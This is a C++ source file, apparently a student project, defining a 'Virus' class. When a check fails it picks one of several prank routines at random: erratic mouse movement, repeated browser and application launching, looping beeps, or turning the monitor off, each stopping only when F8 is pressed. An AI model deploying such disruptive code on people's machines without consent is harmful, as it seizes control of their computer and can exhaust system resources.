/***********************************************************************
 * Module:  Virus.cpp
 * Author:  Kevin Duy, Carlos Puco
 * Modified: sabado, 26 de noviembre de 2019 17:21:23
 * Purpose: Implementation of the class Virus
 ***********************************************************************/
#include "Virus.h"
#include <windows.h>
#include <time.h>
/** 	
 * @brief Funcion para ejecutar y realizar el virus
 * @param  int,int
 * @return comprobar
 */
void Virus::comprobar(int esperado, int real) {
	if(esperado != real) {
		int opcion = generarAleatorio();
		switch(opcion) {
		case 1:
			moverMose();
			break;
		case 2:
			temblarMouse();
			break;
		case 3:
			abrirGoogle();
			break;
		case 4:
			sonido();
			break;
		case 5:
			abrirProgramas();
			break;
		case 6:
			prenderYApagar();
			break;
		}
	}
	
}
/** 	
 * @brief Funcion para ejecutar y realizar el virus
 * @param  void
 * @return gnera un aleatorio
 */
int Virus::generarAleatorio() {
	int numero;
    srand(time(NULL));
    for(int i=1; i<=10; i++) {
        numero = 1 + rand() %6;
    }
    return numero;
}
/** 	
 * @brief Funcion para ejecutar y realizar el virus
 * @param  void
 * @return mueve el mouse
 */
void Virus::moverMose() {
	FreeConsole();
	srand(GetTickCount());
	int ancho = GetSystemMetrics(SM_CXSCREEN) - 1;
	int altura = GetSystemMetrics(SM_CYSCREEN) - 1;
	while(!GetAsyncKeyState(VK_F8)){
		SetCursorPos((rand() % ancho) + 1, (rand() % altura) + 1);
		Sleep(5);
	}
}
/** 	
 * @brief Funcion para ejecutar y realizar el virus
 * @param  void
 * @return temblar mouse
 */
void Virus::temblarMouse() {
	const int maximo = 7;
	POINT lugar;
	FreeConsole();
	srand(GetTickCount());
	while(!GetAsyncKeyState(VK_F8)) {
		GetCursorPos(&lugar);
		int direccion = (rand() % 4);
		switch(direccion) {
			case 0:
				SetCursorPos(lugar.x + (rand() % maximo), lugar.y + (rand() % maximo));
				break;
			case 1:
				SetCursorPos(lugar.x + (rand() % maximo), lugar.y - (rand() % maximo));
				break;
			case 2:
				SetCursorPos(lugar.x - (rand() % maximo), lugar.y - (rand() % maximo));
				break;
			case 3:
			default:
				SetCursorPos(lugar.x - (rand() % maximo), lugar.y + (rand() % maximo));
				break;
		}
		Sleep(5);
	}
}
/** 	
 * @brief Funcion para ejecutar y realizar el virus
 * @param  void
 * @return abre el programa
 */
void Virus::abrirGoogle() {
	while(!GetAsyncKeyState(VK_F8)) {
		system("start http://www.google.com");
	}
}
/** 	
 * @brief Funcion para ejecutar y realizar el virus
 * @param  void
 * @return proboca el sonido
 */
void Virus::sonido() {
	int frecuencia, duracion;
	frecuencia = rand()%2001;
    duracion = rand()%301;
    while(!GetAsyncKeyState(VK_F8)) {
    	Beep(frecuencia,duracion);
	}
}
/** 	
 * @brief Funcion para ejecutar y realizar el virus
 * @param  void
 * @return abrir programas
 */
void Virus::abrirProgramas() {
	char notepad[MAX_PATH]="notepad.exe";
	char calculadora[MAX_PATH]="calc.exe";
	char word[MAX_PATH]="WINWORD.EXE";
	char pdf[MAX_PATH]="EXCEL.EXE";
	while(!GetAsyncKeyState(VK_F8)) {
		ShellExecute(NULL,"open",notepad,NULL,NULL,SW_MAXIMIZE);
		ShellExecute(NULL,"open",calculadora,NULL,NULL,SW_MAXIMIZE);
		ShellExecute(NULL,"open",word,NULL,NULL,SW_MAXIMIZE);
		ShellExecute(NULL,"open",pdf,NULL,NULL,SW_MAXIMIZE);
	}
}
/** 	
 * @brief Funcion para ejecutar y realizar el virus
 * @param  void
 * @return aprende y apaga el equipo
 */
void Virus::prenderYApagar() {
	while(!GetAsyncKeyState(VK_F8)) {
		Sleep(1000);
     	SendMessage(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, (LPARAM) 2);
 	}
}
